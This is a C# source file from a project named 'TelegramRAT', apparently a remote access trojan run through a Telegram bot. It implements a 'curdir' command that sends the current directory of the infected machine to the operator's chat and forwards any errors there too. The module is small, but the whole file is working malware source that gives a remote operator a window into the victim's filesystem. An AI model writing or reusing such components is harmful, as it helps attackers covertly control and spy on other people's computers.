using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class CurDirCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "curdir";
    public override string Description => "Show current directory.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (model.Message != null)
            {
                await botClient.SendMessage(model.Message.Chat.Id, $"Current directory:\n<code>{fileSystemService.GetCurrentDirectory()}</code>", parseMode: ParseMode.Html, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception ex)
        {
            if (model.Message != null)
            {
                await notificationService.ReportExceptionAsync(model.Message, ex);
            }
        }
    }
}
